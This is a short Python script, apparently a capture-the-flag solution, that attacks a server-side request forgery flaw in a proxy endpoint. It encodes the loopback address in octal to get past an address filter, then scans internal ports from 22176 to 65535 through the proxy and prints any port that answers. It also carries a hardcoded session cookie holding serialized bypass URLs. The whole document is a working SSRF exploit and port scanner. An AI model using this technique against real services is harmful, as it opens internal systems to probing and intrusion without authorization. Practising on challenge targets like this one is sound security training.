import requests
import time

url = 'https://ssrf.h4ck3r.quest/proxy?url=http://017700000001:'
cookie = {
    'session': '"!FC2TXU1rfMqKtrFmQ1e3Mw==?gAWVygEAAAAAAACMB3Nlc3Npb26UfZSMCHBheWxvYWRzlF2UKIwTaHR0cHM6Ly9leGFtcGxlLmNvbZSMFGh0dHBzOi8vMTI3LjEyLjM0LjU2lIwVaHR0cHM6Ly8xMjcuMTIuMzQuNTYvlIwOd3d3Lmdvb2dsZS5jb22UjBZodHRwczovL3d3dy5nb29nbGUuY29tlIwRaHR0cDovLzIxMzA3MDY0MzOUjBFodHRwOi8vMHg3ZjAwMDAwMZSME2h0dHA6Ly8wMTc3MDAwMDAwMDGUjBZodHRwOi8vMDE3NzAwMDAwMDAxOjgwlIwXaHR0cDovLzAxNzcwMDAwMDAwMTo0NDOUjBZodHRwOi8vMDE3NzAwMDAwMDAxOjgwlIwVaHR0cDovLzAxNzcwMDAwMDAwMTowlIwWaHR0cDovLzAxNzcwMDAwMDAwMTo4MJSMFmh0dHA6Ly8wMTc3MDAwMDAwMDE6ODCUjBdodHRwOi8vMDE3NzAwMDAwMDAxOjgwL5SMF2h0dHA6Ly8wMTc3MDAwMDAwMDE6ODAvlIwXaHR0cDovLzAxNzcwMDAwMDAwMTo4MC+UjBdodHRwOi8vMDE3NzAwMDAwMDAxOjgwL5Rlc4aULg=="'
}
index = 22176

while index != 65536:

    for i in range(index, 65536):
        index = i
        response = requests.get(url + str(i) + '/', cookies=cookie)
        print(url + str(i))

        if response.status_code == 200:
            print(i)
            print(response.text)

        if 'Connection refused' not in response.text:
            break